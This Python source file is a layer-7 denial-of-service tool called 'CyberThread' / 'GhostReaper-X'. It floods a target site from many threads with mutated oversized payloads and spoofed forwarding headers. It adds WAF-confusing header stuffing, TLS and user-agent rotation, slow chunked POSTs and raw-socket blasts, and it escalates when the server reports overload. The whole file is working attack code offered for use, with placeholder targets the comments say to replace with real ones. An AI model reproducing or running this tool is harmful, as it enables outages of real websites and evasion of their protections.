import http.client
import ssl
import json
import random
import threading
import time
from urllib.parse import urlparse
import socket
import sys
import traceback
import os
import base64
import argparse
import shutil
from datetime import datetime

# ANSI color codes for output
ANSI_RED = "\033[91m"
ANSI_GREEN = "\033[92m"
ANSI_YELLOW = "\033[93m"
ANSI_CYAN = "\033[96m"
ANSI_RESET = "\033[0m"

# Global variables
target = ""
threads = 0
payload_type = ""
ua_file = ""
bypass_header = False
tls_spoofing = False
session_cycle = False
delay = 0
flood_method = ""
failover_monitoring = False
user_agents = []
status_counter = {"200": 0, "403": 0, "503": 0, "other": 0}
semaphore = threading.Semaphore(100)
silent_mode = False
log_file = None
stop_event = threading.Event()
log_file_path = None
parsed_url = None
proxies = [f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}" for _ in range(10)]
max_retries = 5  # Default threshold untuk failover

thread_local = threading.local()

def parse_args():
    parser = argparse.ArgumentParser(description="CyberThread L7 Exploit Tool")
    parser.add_argument("--target", type=str, help="Target URL (e.g., http://example.com)")
    parser.add_argument("--fire", action="store_true", help="Run in brutal mode")
    parser.add_argument("--threads", type=int, default=100, help="Number of threads")
    parser.add_argument("--silent", action="store_true", help="Silent mode (no output)")
    parser.add_argument("--dashboard", action="store_true", help="Live dashboard mode")
    parser.add_argument("--stealth-force", action="store_true", help="Brutal stealth mode (no VPN, no proxy)")
    return parser.parse_args()

def load_list(file):
    if not os.path.exists(file):
        print(f"{ANSI_RED}[ERROR] File not found: {file}{ANSI_RESET}")
        return []
    with open(file, 'r') as f:
        return [x.strip() for x in f if x.strip()]

def load_user_agents(file):
    global user_agents
    if not os.path.exists(file):
        with open(file, 'w') as f:
            f.write("Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n")
    user_agents = load_list(file)

def inject_headers():
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Connection": "keep-alive",
        "User-Agent": generate_user_agent(),
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "id-ID,id;q=0.8", "en-GB,en;q=0.7"])
    }
    headers["X-Request-Timestamp"] = str(int(time.time()))
    headers["X-Timezone"] = random.choice(["UTC", "GMT+7", "PST", "EST"])
    if bypass_header:
        headers["X-Originating-IP"] = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
        headers["X-Forwarded-Host"] = target
        headers["X-Request-ID"] = str(random.randint(100000, 999999))
        headers["X-Amzn-Trace-Id"] = f"Root=1-{random.randint(10000000,99999999)}"
        headers["X-Forwarded-For"] = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
        headers["X-Real-IP"] = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
        headers["Via"] = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
        headers["Forwarded"] = f"for={random.choice(proxies)};host={target}"
        headers["True-Client-IP"] = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
        headers = {k: v.upper() if random.choice([True, False]) else v for k, v in headers.items()}
        headers.update({f"X-Custom-{i}": f"Value{i}" for i in range(random.randint(1, 5))})

        # Brutal header stuffing (WAF confuser)
        if random.random() > 0.5:
            headers.update({
                f"X-Brute-{i}": ''.join(random.choices("0123456789ABCDEF", k=32))
                for i in range(random.randint(50, 150))
            })

    return headers

def generate_user_agent():
    user_agent_pool = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Linux; Android 10)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(user_agent_pool)

def recon_target(url):
    try:
        parsed = urlparse(url)
        common_paths = ["/admin", "/login", "/gateway", "/api/status", "/v1/ping"]
        conn = http.client.HTTPSConnection(parsed.hostname, timeout=5)
        for path in common_paths:
            conn.request("GET", path)
            res = conn.getresponse()
            if res.status in [200, 403]:
                print(f"[RECON ✓] {path} => {res.status}")
    except Exception:
        pass

def mutate_payload(payload_type):
    if payload_type == "ghost-mutation":
        return json.dumps({
            "enc": base64.b64encode(json.dumps({
                "overflow": "A" * random.randint(10000, 20000),
                "multi": [
                    {"depth": i, "blob": "X" * random.randint(1000, 3000)}
                    for i in range(random.randint(10, 30))
                ]
            }).encode()).decode()
        })
    elif payload_type == "mixed":
        return f"data={base64.b64encode(os.urandom(50)).decode()}&chain=A{random.randint(1000,5000)}"
    elif payload_type == "form":
        return "key=value&random=" + str(random.randint(1, 9999))
    elif payload_type == "multipart":
        boundary = "----WebKitFormBoundary" + str(random.randint(1000, 9999))
        data = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="key"\r\n\r\n'
            f"value\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="random"\r\n\r\n'
            f"{random.randint(1, 9999)}\r\n"
            f"--{boundary}--\r\n"
        )
        return data
    else:
        return json.dumps({"error": "unknown payload type"})

def smart_mutate(base_payload):
    mutations = [
        lambda p: p.replace("A", random.choice("XYZabc123")),
        lambda p: p[::-1],
        lambda p: p.upper(),
        lambda p: p + str(os.urandom(random.randint(10, 50))),
        lambda p: base64.b64encode(p.encode()).decode()
    ]
    for mut in random.sample(mutations, k=random.randint(2, 4)):
        base_payload = mut(base_payload)
    return base_payload

def cycle_session():
    try:
        start_time = time.time()
        login_payload = {
            "user": f"user{random.randint(1000,9999)}",
            "pass": f"p{random.randint(10000,99999)}"
        }
        login_headers = inject_headers()
        conn = http.client.HTTPSConnection(parsed_url.hostname, context=rotate_tls_context())
        conn.request("POST", "/login", json.dumps(login_payload), login_headers)
        response = conn.getresponse()
        if response.status != 200:
            print(f"Login failed with status code {response.status}")
            return

        cookies = response.getheader("Set-Cookie")
        action_payload = mutate_payload(payload_type)
        action_headers = inject_headers()
        action_headers["Cookie"] = cookies
        conn.request(flood_method.upper(), target, action_payload, action_headers)
        response = conn.getresponse()
        handle_response(response, target, time.time() - start_time)

        logout_headers = inject_headers()
        conn.request("POST", "/logout", "", logout_headers)
        response = conn.getresponse()
        if response.status != 200:
            print(f"Logout failed with status code {response.status}")
    except Exception as e:
        print(f"{ANSI_RED}[ERROR] cycle_session: {traceback.format_exc()}{ANSI_RESET}")

def handle_response(response, target, rtt):
    status_code = response.status
    response_body = response.read().decode('utf-8', errors='ignore')
    status_counter[str(status_code)] = status_counter.get(str(status_code), 0) + 1
    if not silent_mode:
        if 200 <= status_code < 300:
            print(f"{ANSI_GREEN}[200] OK - RTT: {rtt * 1000:.2f}ms - Payload: {payload_type}{ANSI_RESET}")
        elif status_code == 403:
            print(f"{ANSI_RED}[403] Blocked - Rotating Header/TLS{ANSI_RESET}")
            if tls_spoofing:
                rotate_headers_and_tls()
        elif status_code == 429:
            print(f"{ANSI_YELLOW}[429] Rate Limit - Throttle Mode{ANSI_RESET}")
        elif status_code == 503:
            print(f"{ANSI_YELLOW}[503] Overload - Increasing Pressure{ANSI_RESET}")
        else:
            print(f"{ANSI_RED}[ERROR] Unknown response code {status_code}{ANSI_RESET}")

    analyze_bypass(status_code, response_body)

    if status_counter["503"] > 50:
        print(f"{ANSI_YELLOW}[!] Overload threshold hit — launching raw_socket_blast(){ANSI_RESET}")
        raw_socket_blast(parsed_url.hostname)

def rotate_headers_and_tls():
    thread_local.headers = inject_headers()

def rotate_tls_context():
    if not hasattr(thread_local, "tls_ctx"):
        thread_local.tls_ctx = ssl.create_default_context()
        ciphers = [
            "ECDHE-RSA-AES128-GCM-SHA256",
            "ECDHE-RSA-AES256-GCM-SHA384",
            "ECDHE-ECDSA-AES256-GCM-SHA384",
            "TLS_AES_256_GCM_SHA384"
        ]
        for cipher in ciphers:
            try:
                thread_local.tls_ctx.set_ciphers(cipher)
                return thread_local.tls_ctx
            except ssl.SSLError as e:
                print(f"{ANSI_RED}[ERROR] TLS context rotation failed: {e}{ANSI_RESET}")
    return thread_local.tls_ctx

def analyze_bypass(status_code, response_text):
    global flood_method, delay
    try:
        if "cloudflare" in response_text.lower():
            flood_method = "PATCH"
            delay = 0.02
        if "captcha" in response_text.lower():
            threading.Thread(target=slow_chunked_post, args=(parsed_url.hostname,)).start()

        if "cpatha" in response_text.lower():
            print(f"{ANSI_RED}[!] CPATHA Detected{ANSI_RESET}")
        else:
            print(f"{ANSI_GREEN}[✓] CPATHA Bypass{ANSI_RESET}")

        if "captcha" in response_text.lower():
            print(f"{ANSI_RED}[!] Captcha Firewall Triggered{ANSI_RESET}")
        else:
            print(f"{ANSI_GREEN}[✓] Captcha Bypass{ANSI_RESET}")

        if "cf-ray" in response_text.lower() or "cloudflare" in response_text.lower():
            print(f"{ANSI_GREEN}[✓] WAF Bypass (Cloudflare){ANSI_RESET}")
        elif "x-waf" in response_text.lower():
            print(f"{ANSI_GREEN}[✓] WAF Bypass (Generic){ANSI_RESET}")
        elif status_code == 403:
            print(f"{ANSI_RED}[!] WAF Blocked{ANSI_RESET}")
        else:
            print(f"{ANSI_GREEN}[✓] WAF Passed{ANSI_RESET}")

        if status_code == 429:
            print(f"{ANSI_RED}[!] Rate-Limit Triggered{ANSI_RESET}")
        else:
            print(f"{ANSI_GREEN}[✓] Rate-Limit Bypass{ANSI_RESET}")

        if "akamai" in response_text.lower() or "fastly" in response_text.lower():
            print(f"{ANSI_CYAN}[✓] CDN Identified & Routed{ANSI_RESET}")
    except Exception as e:
        print(f"{ANSI_RED}[ERROR] analyze_bypass: {traceback.format_exc()}{ANSI_RESET}")

def monitor_target():
    global parsed_url
    parsed_url = urlparse(target)
    while not stop_event.is_set():
        try:
            conn = http.client.HTTPSConnection(parsed_url.hostname, timeout=5)
            conn.request("GET", "/")
            resp = conn.getresponse()
            print(f"[MONITOR] {resp.status}")
        except:
            print("[MONITOR] Target not responding.")
        time.sleep(5)

def raw_socket_blast(ip, port=443):
    context = rotate_tls_context()
    with socket.create_connection((ip, port)) as sock:
        with context.wrap_socket(sock, server_hostname=ip) as ssock:
            for _ in range(10):
                payload = f"POST / HTTP/1.1\r\nHost: {ip}\r\nContent-Length: 50000\r\n\r\n{'X'*50000}"
                ssock.send(payload.encode())
                time.sleep(0.3)

def slow_chunked_post(host, port=443):
    try:
        context = rotate_tls_context()
        sock = socket.create_connection((host, port))
        ssock = context.wrap_socket(sock, server_hostname=host)
        req = (
            "POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Content-Type: application/json\r\n\r\n"
        )
        ssock.send(req.encode())
        for _ in range(100):
            chunk = f"{hex(20)[2:]}\r\n" + "X" * 32 + "\r\n"
            ssock.send(chunk.encode())
            time.sleep(0.3)  # Delay per chunk
        ssock.send(b"0\r\n\r\n")
        ssock.close()
    except Exception:
        pass

def launch_ghost_sequence():
    global target, threads, payload_type, ua_file, bypass_header, tls_spoofing, session_cycle, delay, flood_method, failover_monitoring, silent_mode, log_file, parsed_url
    parsed_url = urlparse(target)

    print("\nReady to launch GhostReaper-X Sequence")
    print(f"Target     : {target}")
    print(f"Threads    : {threads}")
    print(f"Payload    : {payload_type}")
    print(f"TLS Finger : {'Enabled' if tls_spoofing else 'Disabled'}")
    print(f"Header Bypass : {'Enabled' if bypass_header else 'Disabled'}")
    print(f"Session Cycle : {'Enabled' if session_cycle else 'Disabled'}")
    print(f"Delay      : {delay}s")
    print(f"Flood Method: {flood_method}")
    print(f"Failover Monitoring : {'Enabled if failover_monitoring else 'Disabled'}")
    print(f"Silent Mode : {'Enabled' if silent_mode else 'Disabled'}")
    print(f"Log File   : {log_file_path if log_file_path else 'None'}")

    load_user_agents(ua_file)

    print(f"[✓] Running recon on {target} ...")
    recon_target(target)

    def worker():
        local_retry = 0
        local_headers = get_thread_headers()

        # 🔧 Inisialisasi TLS context kalau belum ada
        if not hasattr(thread_local, "tls_ctx"):
            thread_local.tls_ctx = rotate_tls_context()

        while not stop_event.is_set():
            try:
                semaphore.acquire()
                conn = http.client.HTTPSConnection(parsed_url.hostname, context=thread_local.tls_ctx)
                paths = ["/", "/ping", "/admin", "/admin/login", "/?debug", "/v1/chain"]
                chain_path = random.choice(paths)
                payload_data = smart_mutate(mutate_payload(payload_type))
                method = random.choice(["POST", "PUT", "PATCH", "OPTIONS"])
                if random.random() < 0.3:
                    local_headers = get_thread_headers()
                conn.request(method, chain_path, payload_data, local_headers)
                start_time = time.time()
                response = conn.getresponse()
                rtt = time.time() - start_time
                handle_response(response, target, rtt)
                if session_cycle:
                    cycle_session()
                if failover_monitoring and response.status in [403, 429, 503]:
                    local_retry += 1
                    if local_retry >= max_retries:
                        stop_event.set()
                        break
                    time.sleep(delay + random.uniform(0.2, 1.0))
                if time.time() % 8 > 5:
                    time.sleep(2.5)  # Delay burst cooldown
            except Exception as e:
                if log_file:
                    with open(log_file_path, 'a') as f:
                        f.write(f"{ANSI_RED}[ERROR] worker: {traceback.format_exc()}{ANSI_RESET}\n")
                else:
                    print(f"{ANSI_RED}[ERROR] worker: {traceback.format_exc()}{ANSI_RESET}")
            finally:
                semaphore.release()
                time.sleep(delay + random.uniform(0.1, 0.5))

    def get_thread_headers():
        if not hasattr(thread_local, "headers"):
            thread_local.headers = inject_headers()
        return thread_local.headers

    thread_pool = []
    for i in range(threads):
        thread = threading.Thread(target=worker)
        thread.start()
        thread_pool.append(thread)
        time.sleep(random.uniform(0.01, 0.03))  # WAF evasive ramp-up

    if args.dashboard:
        threading.Thread(target=render_dashboard).start()
    else:
        threading.Thread(target=print_status).start()

    if failover_monitoring:
        threading.Thread(target=monitor_target).start()

    for thread in thread_pool:
        thread.join()

    print("GhostReaper-X sequence terminated.")

def print_status():
    last_state = {"200": -1, "403": -1, "503": -1}
    while not stop_event.is_set():
        if (status_counter["200"] != last_state["200"] or
            status_counter["403"] != last_state["403"] or
            status_counter["503"] != last_state["503"]):
            print(f"✅ 200: {status_counter['200']} | 🔒 403: {status_counter['403']} | ⚠️ 503: {status_counter['503']}")
            sys.stdout.flush()
            last_state.update(status_counter)
        time.sleep(1)

def render_dashboard():
    while not stop_event.is_set():
        columns = shutil.get_terminal_size().columns
        now = datetime.now().strftime("%H:%M:%S")

        # Clear screen
        sys.stdout.write("\033[H\033[J")
        print(f"{' CYBERTHREAD LIVE DASHBOARD ':=^{columns}}")
        print(f"Time         : {now}")
        print(f"Target       : {target}")
        print(f"Threads      : {threads}")
        print(f"Payload      : {payload_type}")
        print(f"Method       : {flood_method.upper()}")
        print(f"TLS Spoofing : {'ENABLED' if tls_spoofing else 'DISABLED'}")
        print(f"Header Bypass: {'ENABLED' if bypass_header else 'DISABLED'}")
        print(f"Stealth Mode  : {'ENABLED' if args.stealth_force else 'DISABLED'}")
        print("=" * columns)
        print(f"✅ 200 OK     : {status_counter['200']}")
        print(f"🔒 403 Blocked: {status_counter['403']}")
        print(f"⚠️ 503 Overload: {status_counter['503']}")
        print("=" * columns)
        print("Press Ctrl+C to stop...\n")
        time.sleep(1)

def print_banner_brutal():
    print("""╔══════════════════════════════════════╗
║   ☠ CYBERTHREAD ☠           ║
║   Threads: █████            ║
║   Target: WAF/CDN           ║
║   Header: Bypass Enabled    ║
║   TLS: Spoofed              ║
╚══════════════════════════════════════╝
    """)

if __name__ == "__main__":
    args = argparse.Namespace(
        target="https://realtarget.com",
        fire=True,
        threads=200,
        silent=False,
        dashboard=True,
        stealth_force=False
    )

    if args.target:
        target = args.target
        parsed_url = urlparse(target)
    elif args.fire or args.stealth_force:
        target = "https://targetlo.com"  # Ganti dengan target real
        parsed_url = urlparse(target)
    else:
        print(f"{ANSI_RED}[ERROR] --target required unless --fire or --stealth-force with fallback{ANSI_RESET}")
        print("Example usage: python script.py --target https://example.com --threads 200 --fire")
        exit()

    if not log_file_path:
        log_file_path = f"/sdcard/cyberthread_log_{int(time.time())}.txt"

    print_banner_brutal()

    if args.silent:
        silent_mode = True

    if args.fire:
        bypass_header = True
        tls_spoofing = True
        session_cycle = True
        failover_monitoring = True
        delay = 0.1
        payload_type = "ghost-mutation"
        threads = args.threads
        flood_method = "POST"
        ua_file = "/tmp/ua_fallback.txt"

    if args.stealth_force:
        bypass_header = True
        tls_spoofing = True
        session_cycle = True
        failover_monitoring = True
        payload_type = "ghost-mutation"
        threads = args.threads if args.threads else 300
        delay = 0.05
        flood_method = "PATCH"
        ua_file = "/tmp/ua_fallback.txt"
        threading.Thread(target=slow_chunked_post, args=(parsed_url.hostname,)).start()

    launch_ghost_sequence()